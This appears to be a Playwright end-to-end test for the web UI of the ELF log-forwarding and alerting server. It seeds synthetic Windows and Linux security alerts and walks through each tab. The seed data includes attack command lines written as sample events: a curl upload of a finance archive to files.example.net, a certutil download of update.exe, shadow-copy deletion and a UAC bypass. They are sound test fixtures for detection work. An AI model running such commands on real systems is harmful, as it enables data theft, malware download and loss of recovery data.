"""End-to-end browser test for the ELF web UI (Playwright).

Starts the server on a free port with a throwaway, seeded SQLite database,
registers four synthetic agents and posts alerts/log batches through the
agent API, then drives a real browser through every tab and the paths that
matter: login, agents (collect panel survives a re-render), groups, rules
(open a rule without refetching the list, search, select mode, import
modal, Escape), lists, alerts (sequence + window evidence, also-matched
link), metrics, logs, users, audit (tab survives a reload), docs, the
Add-Agent modal and a narrow viewport. Console errors, page errors and
failed requests fail the run.

Run from the repo root:
  pip install playwright && playwright install chromium     (once)
  .venv\\Scripts\\python.exe -I tests/server/e2e_ui.py [--channel msedge] [--shots DIR]

--channel msedge / chrome uses the locally installed browser (no download);
--shots DIR saves one PNG per view (the docs/img captures are made this way).
"""
import argparse
import http.cookiejar
import json
import os
import random
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
SERVER_DIR = os.path.abspath(os.path.join(HERE, "..", "..", "server"))


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def start_server(tmp, port):
    env = dict(os.environ, ELF_DB_PATH=os.path.join(tmp, "elf.db"), ELF_AGENT_BINARY_DIR=tmp,
               ELF_SEED_TEST_DATA="1", ELF_REQUIRE_AGENT_TOKEN="1")
    log = open(os.path.join(tmp, "server.log"), "w")
    proc = subprocess.Popen([sys.executable, "-m", "uvicorn", "main:app", "--host", "127.0.0.1", "--port", str(port)],
                            cwd=SERVER_DIR, env=env, stdout=log, stderr=subprocess.STDOUT)
    base = f"http://127.0.0.1:{port}"
    for _ in range(100):
        try:
            urllib.request.urlopen(base + "/health", timeout=1).read()
            return proc, base
        except Exception:
            if proc.poll() is not None:
                raise RuntimeError("server exited: " + open(os.path.join(tmp, "server.log")).read()[-2000:])
            time.sleep(0.2)
    raise RuntimeError("server did not start")


def seed(base):
    """Four agents, eight alerts (one sequence, one threshold window, one
    with also_matched), a few log batches, and metrics counters."""
    tokens = {}

    def req(method, path, body=None, agent=None):
        data = None if body is None else json.dumps(body).encode()
        h = {"Content-Type": "application/json"}
        if agent:
            h["Authorization"] = "Bearer " + tokens[agent]
        r = urllib.request.Request(base + path, data=data, method=method, headers=h)
        with urllib.request.urlopen(r) as resp:
            t = resp.read().decode()
            return json.loads(t) if t else None

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.open(urllib.request.Request(base + "/auth/login", data=json.dumps({"username": "admin", "password": "admin"}).encode(),
                                       headers={"Content-Type": "application/json"}, method="POST")).read()
    groups = {g["name"]: g["id"] for g in json.loads(opener.open(base + "/groups").read())}
    ws, srv, lin = groups["workstations"], groups["servers"], groups["linux-servers"]

    agents = [("FIN-WS-0412", "10.20.4.12", "Microsoft Windows 11 Enterprise", ws, (184233, 276_349_500, 2190, 3_285_000)),
              ("ENG-WS-0207", "10.20.2.7", "Microsoft Windows 11 Pro", ws, (97120, 145_680_000, 1402, 2_103_000)),
              ("HR-WS-0133", "10.20.1.33", "Microsoft Windows 10 Enterprise", ws, (61240, 91_860_000, 388, 582_000)),
              ("APP-SRV-02", "10.30.0.12", "Microsoft Windows Server 2022 Standard", srv, (912330, 1_368_495_000, 4810, 7_215_000)),
              ("web-01", "10.40.0.21", "Ubuntu 24.04.3 LTS (kernel 6.8.0-71-generic)", lin, (348910, 118_629_400, 1266, 1_519_200)),
              ("db-01", "10.40.0.34", "Ubuntu 26.04.1 LTS (kernel 7.0.0-34-generic)", lin, (221504, 79_741_440, 702, 842_400))]
    for host, ip, osn, gid, (ec, bc, ef, bf) in agents:
        reg = req("POST", "/agents/register", {"agent_id": host, "hostname": host, "ip_address": ip, "os_name": osn, "group_id": gid})
        tokens[host] = reg["auth_token"]
        req("GET", f"/config/{host}?hostname={host}&ip={ip}&os={urllib.request.quote(osn)}"
                   f"&events_created={ec}&bytes_created={bc}&events_forwarded={ef}&bytes_forwarded={bf}", agent=host)

    rid = [50000]

    def ev(eid, host, data):
        rid[0] += 1
        ts = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + ".0000000Z"
        d = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
        return (f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
                f"<Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>{eid}</EventID>"
                f"<TimeCreated SystemTime='{ts}'/><EventRecordID>{rid[0]}</EventRecordID>"
                f"<Channel>Security</Channel><Computer>{host}</Computer></System><EventData>{d}</EventData></Event>")

    def jev(channel, eid, host, data):
        """A journal entry as the Linux agent renders it: the syslog
        identifier (or "audit") as the channel, the audit record type as
        the event id, the journal fields as Data elements."""
        rid[0] += 1
        ts = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + ".000000Z"
        fields = {"TRANSPORT": "audit" if channel == "audit" else "syslog", "SYSLOG_IDENTIFIER": channel}
        fields.update(data)
        d = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in fields.items())
        return (f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
                f"<Provider Name='{channel}'/><EventID>{eid}</EventID><Level>4</Level>"
                f"<TimeCreated SystemTime='{ts}'/><EventRecordID>{1792490000000000 + rid[0]}</EventRecordID>"
                f"<Channel>{channel}</Channel><Computer>{host}</Computer></System><EventData>{d}</EventData></Event>")

    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    alerts = [
        ("web-01", "lin_ssh_brute_force", "high", "Possible SSH brute force: 5 failed logins within 60s.",
         jev("sshd-session", 0, "web-01", {"Message": "Failed password for invalid user admin from 198.51.100.23 port 51822 ssh2", "PRIORITY": "6", "pid": "41822"}), [],
         [jev("sshd-session", 0, "web-01", {"Message": f"Failed password for invalid user {u} from 198.51.100.23 port {p} ssh2", "PRIORITY": "6"})
          for u, p in (("root", "51790"), ("ubuntu", "51797"), ("admin", "51803"), ("test", "51811"))], []),
        ("db-01", "lin_new_user_or_group", "medium", "A local account or group was created.",
         jev("useradd", 0, "db-01", {"Message": "new user: name=svc-report, UID=1004, GID=1004, home=/home/svc-report, shell=/bin/bash", "PRIORITY": "6", "pid": "28817", "uid": "0"}), [], [], []),
        ("FIN-WS-0412", "win_kc_01_ps_encoded", "high", "Execution step of the MITRE kill chain - encoded PowerShell command line",
         ev(4688, "FIN-WS-0412", {"NewProcessName": ps, "NewProcessId": "0x1a3c", "CommandLine": "powershell.exe -NoProfile -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
                                  "SubjectUserName": "m.alvarez", "SubjectDomainName": "CORP", "ParentProcessName": r"C:\Windows\explorer.exe"}),
         [], [], ["win_ps_generic_launch"]),
        ("ENG-WS-0207", "win_kc_06_password_spray", "high", "Credential Access step of the MITRE kill chain - many failed logons from one source IP",
         ev(4625, "ENG-WS-0207", {"TargetUserName": "svc-backup", "IpAddress": "10.20.9.77", "LogonType": "3", "Status": "0xc000006d"}), [],
         [ev(4625, "ENG-WS-0207", {"TargetUserName": u, "IpAddress": "10.20.9.77", "LogonType": "3"}) for u in ("administrator", "j.chen", "p.okafor", "svc-sql")], []),
        ("FIN-WS-0412", "win_kc_11_stage_exfil", "high", "Exfiltration step of the MITRE kill chain - archive staging followed by an upload command",
         ev(4688, "FIN-WS-0412", {"NewProcessName": r"C:\Windows\System32\curl.exe", "CommandLine": "curl.exe -T C:\\Users\\m.alvarez\\AppData\\Local\\Temp\\q3-forecast.zip https://files.example.net/up", "SubjectUserName": "m.alvarez"}),
         [ev(4688, "FIN-WS-0412", {"NewProcessName": ps, "CommandLine": "powershell -Command Compress-Archive -Path C:\\Finance\\Q3 -DestinationPath $env:TEMP\\q3-forecast.zip", "SubjectUserName": "m.alvarez"})], [], []),
        ("HR-WS-0133", "win_kc_10_ingress_transfer", "high", "Command and Control step of the MITRE kill chain - LOLBin download cradle",
         ev(4688, "HR-WS-0133", {"NewProcessName": r"C:\Windows\System32\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/update.txt C:\\Users\\Public\\update.exe", "SubjectUserName": "d.nowak"}), [], [], []),
        ("APP-SRV-02", "win_kc_12_inhibit_recovery", "critical", "Impact step of the MITRE kill chain - shadow copies deleted",
         ev(4688, "APP-SRV-02", {"NewProcessName": r"C:\Windows\System32\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "SubjectUserName": "SYSTEM"}), [], [], []),
        ("ENG-WS-0207", "win_kc_03_uac_bypass", "medium", "Privilege Escalation step of the MITRE kill chain - auto-elevate binary launched",
         ev(4688, "ENG-WS-0207", {"NewProcessName": r"C:\Windows\System32\fodhelper.exe", "CommandLine": "fodhelper.exe", "SubjectUserName": "j.chen"}), [], [], []),
        ("HR-WS-0133", "win_kc_09_archive_stage", "medium", "Collection step of the MITRE kill chain - data staged with an archive tool",
         ev(4688, "HR-WS-0133", {"NewProcessName": ps, "CommandLine": "powershell -Command Compress-Archive -Path C:\\HR\\Payroll -DestinationPath C:\\Users\\Public\\p.zip", "SubjectUserName": "d.nowak"}), [], [], []),
        ("APP-SRV-02", "win_kc_04_log_clear", "high", "Defense Evasion step of the MITRE kill chain - event log cleared",
         ev(1102, "APP-SRV-02", {"SubjectUserName": "a.reyes", "SubjectDomainName": "CORP", "SubjectLogonId": "0x3e7"}), [], [], []),
    ]
    # Each fire gets an alert id (as the agent generates it); the forward_buffer
    # batches below reuse the ids of the rules that also ship context.
    random.seed(7)
    fire_ids = {}
    for host, rule, level, msg, xml, seq, win, also in alerts:
        fire_ids[(host, rule)] = "%016x" % random.getrandbits(64)
        req("POST", f"/alerts?agent_id={host}", {"rule_id": rule, "message": msg, "level": level, "event_xml": xml,
                                                 "sequence_events": seq, "window_events": win, "also_matched": also,
                                                 "alert_id": fire_ids[(host, rule)]}, agent=host)
    batches = [("FIN-WS-0412", "win_kc_11_stage_exfil"), ("ENG-WS-0207", "win_kc_06_password_spray"),
               ("APP-SRV-02", "win_kc_04_log_clear"), ("HR-WS-0133", "win_kc_10_ingress_transfer"),
               ("web-01", "lin_ssh_brute_force")]
    for k in range(13):
        host, rule = batches[k % 5]
        n = random.randint(3, 40)
        if host == "web-01":
            events = [jev("sudo", 0, host, {"Message": f"deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app-{i}", "PRIORITY": "5"}) for i in range(n)]
        else:
            events = [ev(4688, host, {"NewProcessName": r"C:\Windows\System32\cmd.exe", "CommandLine": f"cmd /c echo {i}"}) for i in range(n)]
        body = {"rule_id": rule, "event_count": n, "events": events}
        if k < 5:
            body["alert_id"] = fire_ids[(host, rule)]   # the batch of that fire
        req("POST", f"/logs?agent_id={host}", body, agent=host)


def spread_timestamps(tmp):
    """Screenshots only: spread the seeded alerts and batches over the last
    24 h directly in the throwaway DB so the Metrics charts have a shape (the
    API stamps received_at itself)."""
    import sqlite3
    con = sqlite3.connect(os.path.join(tmp, "elf.db"))
    now = time.time()
    rnd = random.Random(11)
    for aid, in con.execute("SELECT id FROM alerts").fetchall():
        con.execute("UPDATE alerts SET received_at=? WHERE id=?", (now - rnd.uniform(0, 22 * 3600), aid))
    for lid, in con.execute("SELECT id FROM forwarded_logs").fetchall():
        t = now - rnd.choice([rnd.uniform(0, 3 * 3600), rnd.uniform(5 * 3600, 9 * 3600), rnd.uniform(12 * 3600, 23 * 3600)])
        con.execute("UPDATE forwarded_logs SET received_at=? WHERE id=?", (t, lid))
    con.commit()
    con.close()


def walk(base, channel, shots):
    from playwright.sync_api import sync_playwright
    errors = []

    def shot(page, name):
        if not shots:
            return
        page.wait_for_timeout(350)
        page.screenshot(path=os.path.join(shots, name + ".png"))

    with sync_playwright() as p:
        kw = {"headless": True}
        if channel:
            kw["channel"] = channel
        browser = p.chromium.launch(**kw)
        ctx = browser.new_context(viewport={"width": 1440, "height": 900})
        page = ctx.new_page()
        # The pre-login GET /auth/me is a 401 by design; the browser logs it
        # as a console error, so that one is expected.
        page.on("console", lambda m: errors.append(("console." + m.type, m.text))
                 if m.type == "error" and "401" not in m.text else None)
        page.on("pageerror", lambda e: errors.append(("pageerror", str(e))))
        page.on("requestfailed", lambda r: errors.append(("requestfailed", r.url + " " + str(r.failure))))
        page.on("response", lambda r: errors.append(("http", f"{r.status} {r.request.method} {r.url}"))
                 if r.status >= 400 and not r.url.endswith("/auth/me") else None)

        page.goto(base + "/")
        page.wait_for_selector("#login-overlay", state="visible")
        shot(page, "login")
        page.fill("#login-user", "admin"); page.fill("#login-pass", "admin")
        page.click("#login-form button[type=submit]")
        page.wait_for_selector("#login-overlay", state="hidden")
        page.wait_for_selector("#agents-table tbody tr[id^=arow-]")
        print("  login ok")

        # Agents
        page.wait_for_timeout(500)
        shot(page, "agents")
        page.click("#agents-table tbody tr:first-child button[title='Collect logs / actions']")
        page.wait_for_selector(".agent-panel-row")
        page.locator(".agent-panel-row input[type=datetime-local]").fill("2026-10-20T01:00")
        page.evaluate("renderAgents()")   # what the 5 s auto-refresh does
        assert page.locator(".agent-panel-row input[type=datetime-local]").input_value() == "2026-10-20T01:00", "collect date lost on re-render"
        page.fill("#agents-search", "fin")
        assert page.locator("#agents-table tbody tr[id^=arow-]").count() == 1, "agent search filter"
        page.fill("#agents-search", "")
        page.click("#agents-table tbody tr:first-child button[title='Collect logs / actions']")
        print("  agents ok")

        # Groups
        page.click("#tab-groups"); page.wait_for_selector(".g-card")
        page.click(".g-card:nth-child(2) .g-card-head")
        page.wait_for_selector(".g-card-body.open")
        shot(page, "groups")

        # Rules
        page.click("#tab-rules"); page.wait_for_selector("#rules-list .rule-item")
        page.select_option("#rule-group-filter", label="workstations")
        page.wait_for_function("document.querySelectorAll('#rules-list .rule-item').length >= 12")
        n0 = page.evaluate("performance.getEntriesByType('resource').filter(r => r.name.includes('/rules?')).length")
        page.click("#rules-list .rule-item >> text=Kill-Chain 11")
        page.wait_for_function("document.getElementById('r-yaml').value.startsWith('title:')")
        page.wait_for_selector("#validation-status.ok")
        n1 = page.evaluate("performance.getEntriesByType('resource').filter(r => r.name.includes('/rules?')).length")
        assert n1 == n0, f"opening a rule refetched the rules list ({n1 - n0} extra requests)"
        assert page.locator("#rules-list .rule-item.active").count() == 1
        shot(page, "rules")
        page.fill("#rules-search", "exfil")
        page.wait_for_function("document.querySelectorAll('#rules-list .rule-item').length === 1")
        page.fill("#rules-search", "")
        page.click("#rule-select-toggle")
        page.wait_for_selector("#rules-list .rule-item.sel")
        page.click("#rules-list .rule-item.sel >> nth=0")
        assert page.locator("#rule-select-count").inner_text().startswith("1 ")
        page.click("#rules-list .rule-item.sel input >> nth=1")
        assert page.locator("#rule-select-count").inner_text().startswith("2 ")
        page.click("#rule-select-all")
        assert page.locator("#rule-bulk-delete-btn").inner_text().startswith("Delete (")
        page.click("#rule-select-bar button:has-text('Cancel')")
        page.click(".rules-left-header button:has-text('Import')")
        page.wait_for_selector("#import-rules-modal", state="visible")
        shot(page, "rules-import")
        page.keyboard.press("Escape")
        assert page.locator("#import-rules-modal").is_hidden(), "Escape did not close the modal"
        print("  rules ok")

        # Lists
        page.click("#tab-lists"); page.wait_for_selector("#lists-list .rule-item")
        page.click("#lists-list .rule-item >> nth=0")
        page.wait_for_selector("#lists-editor-pane", state="visible")
        assert page.locator("#lists-list .rule-item.active").count() == 1
        shot(page, "lists")

        # Alerts
        page.click("#tab-alerts"); page.wait_for_selector("#alerts-table tbody tr")
        page.click("#alerts-table tbody tr:has-text('Exfiltration') button")
        page.wait_for_selector(".alert-detail .seq-item")
        page.evaluate("document.querySelector('main').scrollTop = 0")
        shot(page, "alerts")
        page.click("#alerts-table tbody tr:has-text('Exfiltration') button")
        page.click("#alerts-table tbody tr:has-text('Password Spray') button")
        page.wait_for_selector(".alert-detail-row:has-text('Window events (4)')")
        page.click("#alerts-table tbody tr:has-text('Password Spray') button")
        page.click("#alerts-table tbody tr:has-text('Encoded PowerShell') button")
        page.wait_for_selector(".alert-detail-row:has-text('Also matched')")
        shot(page, "alerts-detail")
        page.once("dialog", lambda d: d.dismiss())   # synthetic rule id -> "not in any group" alert()
        page.click(".alert-detail-row a:has-text('win_ps_generic_launch')")
        page.wait_for_timeout(500)
        page.fill("#alerts-search", "vssadmin")
        page.wait_for_function("document.querySelectorAll('#alerts-table tbody tr').length === 1")
        page.fill("#alerts-search", "")
        print("  alerts ok")

        # Metrics / Logs / Users / Audit / Docs
        page.click("#tab-metrics"); page.wait_for_selector("#metrics-savings-table tbody tr")
        page.wait_for_function("document.getElementById('metrics-count-total').textContent.includes('events')")
        page.wait_for_timeout(800)
        shot(page, "metrics")
        page.click("#tab-logs"); page.wait_for_selector("#logs-table tbody tr")
        shot(page, "logs")
        page.click("#tab-users"); page.wait_for_selector("#users-table tbody tr")
        page.click("#tab-audit"); page.wait_for_selector("#audit-table tbody tr")
        shot(page, "audit")
        page.reload(); page.wait_for_selector("#audit-table tbody tr")
        assert page.locator("#tab-audit.active").count() == 1, "refresh did not stay on Audit"
        page.click("#tab-docs"); page.wait_for_timeout(200)
        page.click("#docs-toc a[href='#doc-destinations']"); page.wait_for_timeout(300)
        shot(page, "docs-destinations")
        print("  metrics/logs/users/audit/docs ok")

        # Add agent modal (an agent binary is staged in the data dir)
        page.click("#tab-agents")
        page.click("header button:has-text('Add New Agent')")
        page.wait_for_selector("#add-agent-modal", state="visible")
        page.click("#add-agent-modal button:has-text('Generate')")
        page.wait_for_function("document.getElementById('add-agent-script').value.length > 100")
        shot(page, "install-script")
        # Linux: switching the OS clears the script, swaps the account
        # options and the cleanup script, and Generate yields the bash form.
        page.click("#add-agent-os-linux")
        page.wait_for_function("document.getElementById('add-agent-script').value.length == 0")
        assert page.locator("#add-agent-linux-account").is_visible(), "Linux account options hidden"
        assert page.locator("#add-agent-windows-account").is_hidden(), "Windows account options shown for Linux"
        page.wait_for_function("document.getElementById('cleanup-script').value.startsWith('#!/bin/bash')")
        page.check("#add-agent-audit-execve")
        page.select_option("#add-agent-group", "linux-servers")
        page.click("#add-agent-modal button:has-text('Generate')")
        page.wait_for_function("document.getElementById('add-agent-script').value.includes('ELF_INSTALL')")
        assert "elf-execve.rules" in page.locator("#add-agent-script").input_value(), "audit option not in the script"
        assert page.locator("#add-agent-download").text_content() == "Download .sh"
        shot(page, "install-script-linux")
        print("  add-agent (windows + linux) ok")
        page.keyboard.press("Escape")

        # Narrow viewport: header wraps, no horizontal scroll
        page.set_viewport_size({"width": 820, "height": 700})
        page.click("#tab-alerts"); page.wait_for_timeout(300)
        sw = page.evaluate("document.documentElement.scrollWidth")
        cw = page.evaluate("document.documentElement.clientWidth")
        assert sw <= cw, f"horizontal overflow at 820px: {sw} > {cw}"
        browser.close()
    return errors


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--channel", default="", help="chromium channel: msedge, chrome (default: bundled chromium)")
    ap.add_argument("--shots", default="", help="directory for screenshots")
    args = ap.parse_args()
    if args.shots:
        os.makedirs(args.shots, exist_ok=True)
    tmp = tempfile.mkdtemp(prefix="elf_e2e_")
    # stage (fake) agent binaries so the install-script modal has no warning
    with open(os.path.join(tmp, "efficient_log_forwarder.exe"), "wb") as f:
        f.write(b"MZ" + b"\0" * 64)
    with open(os.path.join(tmp, "elf-agent"), "wb") as f:
        f.write(b"\x7fELF" + b"\0" * 64)
    port = free_port()
    proc, base = start_server(tmp, port)
    try:
        seed(base)
        if args.shots:
            spread_timestamps(tmp)
        print("seeded", base)
        errors = walk(base, args.channel, args.shots)
    finally:
        proc.terminate()
        try:
            proc.wait(5)
        except Exception:
            proc.kill()
    if errors:
        print("browser errors:")
        for k, t in errors:
            print(" ", k, t[:300])
        sys.exit(1)
    print("UI E2E PASSED")


if __name__ == "__main__":
    main()
